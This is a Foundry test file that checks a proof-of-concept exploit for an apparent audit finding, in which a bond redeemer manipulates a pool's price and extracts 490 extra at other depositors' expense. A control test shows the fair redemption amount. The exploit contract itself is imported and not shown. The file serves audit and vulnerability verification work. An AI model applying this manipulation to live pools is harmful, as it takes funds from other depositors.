// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Usd, Pool} from "./49239-h-10-users-can-sell-bondtoken-at-a-higher-price-by-manipulat.sol";

contract Finding49239Test is Test {
    function test_exploit_bond_redeemer_extracts_490_extra() public {
        Exploit e = new Exploit();
        uint256 before = e.usd().balanceOf(address(e));
        e.run();

        assertEq(before, 220, "opening cash");
        assertEq(e.fair(), 4400, "fair 50-bond redeem");
        assertEq(e.bondsOut(), 5000, "paid at target price");
        assertEq(e.levOut(), 110, "leverage unwind");
        assertEq(e.profit(), 4890, "net cash");
        assertEq(e.profit() - e.fair(), 490, "other depositors lose 490");
        assertEq(e.usd().balanceOf(address(e)), 5110, "4400 fair plus 220 returned is not the end state");
        assertEq(e.pool().bondSupply(), 50, "half the bonds left");
        assertEq(e.pool().tvl(), 6220 - 110, "pool paid the extra");
    }

    function test_control_without_leverage_buy_pays_4400() public {
        Exploit e = new Exploit();
        uint256 got = e.redeemWithoutLift();
        assertEq(got, 4400, "threshold price");
        assertEq(e.usd().balanceOf(address(e)), 220 - 0 + 4400, "no excess");
        assertEq(e.pool().tvl(), 11000 - 4400, "pool keeps the other 80/20 split");
    }
}
